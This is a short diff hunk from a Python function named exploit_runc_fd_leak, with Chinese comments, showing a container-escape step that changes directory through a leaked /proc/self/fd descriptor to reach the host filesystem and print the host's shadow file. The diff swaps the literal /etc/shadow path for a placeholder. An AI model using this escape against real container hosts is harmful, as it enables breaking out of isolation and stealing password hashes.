@@ -88,7 +88,7 @@ def exploit_runc_fd_leak():
                 # Step 2: chdir 到 host 路径
                 os.chdir(f"/proc/self/fd/{fd}")
                 # Step 3: 现在是 host 文件系统
-                with open("/etc/shadow", "r") as f:
+                with open("<shadow-file>", "r") as f:
                     print(f.read()[:100])  # 宿主机的 shadow!
         except: pass
 ```
